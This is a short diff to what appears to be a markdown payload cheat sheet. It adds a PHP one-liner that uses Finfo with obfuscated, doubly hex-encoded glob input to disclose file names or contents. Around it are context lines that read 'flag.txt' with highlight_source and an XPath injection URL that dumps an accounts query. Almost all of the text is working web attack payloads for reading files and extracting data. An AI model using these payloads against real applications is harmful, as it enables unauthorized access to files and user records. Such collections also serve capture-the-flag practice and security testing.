@@ -33,6 +33,11 @@ highlight_source("flag.txt");
 highlight_source(glob("*")[4]);
 ```
 
+*With Finfo()*
+```php
+new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
+```
+
 ### XPATH Dump
 ```
 https://example.com/accounts.php?user=test"]/../*%00&xpath_debug=1
